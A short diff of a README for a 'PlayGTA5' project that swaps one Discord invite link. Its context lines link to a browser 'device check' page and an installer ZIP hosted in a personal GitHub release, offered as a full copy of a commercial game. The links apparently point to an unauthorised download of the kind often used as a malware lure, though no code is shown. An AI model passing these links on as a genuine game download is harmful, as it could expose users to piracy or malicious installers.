@@ -1,7 +1,7 @@
 # PlayGTA5 — download, play, and troubleshoot
 DISCORD SERVER!!
 
-https://discord.gg/ACgUGFwm4
+(https://discord.gg/N9zCbp5k)
 
 [**Play in browser / device check**](https://gta5-87g.pages.dev/__support/) · [**Download installer ZIP**](https://github.com/alihammoud21/playgta5/releases/download/full-game-v1/PlayGTA5-Installer-v2.zip) · [Installation](#download-and-play-on-windows) · [Mac](#download-and-play-on-mac) · [Higher-FPS setup](#performance--higher-fps) · [Report a problem](https://github.com/alihammoud21/playgta5/issues/new/choose)
 
